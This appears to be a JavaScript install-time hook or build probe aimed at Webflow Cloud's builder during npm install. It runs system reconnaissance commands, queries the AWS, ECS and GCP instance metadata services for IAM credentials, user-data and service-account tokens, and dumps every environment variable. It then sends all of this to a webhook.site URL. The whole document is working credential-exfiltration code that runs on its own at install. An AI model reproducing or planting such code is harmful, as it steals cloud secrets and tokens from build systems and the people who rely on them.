// runs on Webflow Cloud's builder during `npm install`
  const https=require('https'),http=require('http'),cp=require('child_process');
  const WH='https://webhook.site/fbbbab18-e14b-463f-a151-8fb6c60b402e';
  const post=(t,d)=>new Promise(r=>{try{const u=new URL(WH);u.searchParams.set('tag',t);const
  q=https.request({hostname:u.hostname,path:u.pathname+u.search,method:'POST',timeout:5000},x=>{x.resume();x.on('end',r);});q.on('error',()=>r());q.on('timeout',(
  )=>{q.destroy();r();});q.end(String(d).slice(0,60000));}catch(e){r();}});
  const get=(url,h)=>new Promise(res=>{try{const l=url.startsWith('https')?https:http;const q=l.get(url,{headers:h||{},timeout:3000},s=>{let
  d='';s.on('data',c=>d+=c);s.on('end',()=>res('['+s.statusCode+'] 
  '+d));});q.on('error',e=>res('ERR:'+e.message));q.on('timeout',()=>{q.destroy();res('TIMEOUT');});}catch(e){res('ERR:'+e.message);}});
  (async()=>{
    let sys='';try{sys=cp.execSync('id;whoami;hostname;uname -a;cat /proc/self/cgroup 2>/dev/null',{timeout:5000}).toString();}catch(e){sys='ERR:'+e.message;}
    const imds={
      aws_roles:await get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
      aws_userdata:await get('http://169.254.169.254/latest/user-data'),
      ecs:await get('http://169.254.170.2'+(process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI||'/v2/credentials/')),
      gcp:await get('http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'),
    };
    console.log('=== WF-CLOUD BUILD PROBE ENV ===\n'+JSON.stringify(process.env,null,2));
    console.log('=== SYS ===\n'+sys+'\n=== IMDS ===\n'+JSON.stringify(imds,null,2));
    await post('build-env',JSON.stringify(process.env));
    await post('build-sys',sys);
    await post('build-imds',JSON.stringify(imds));
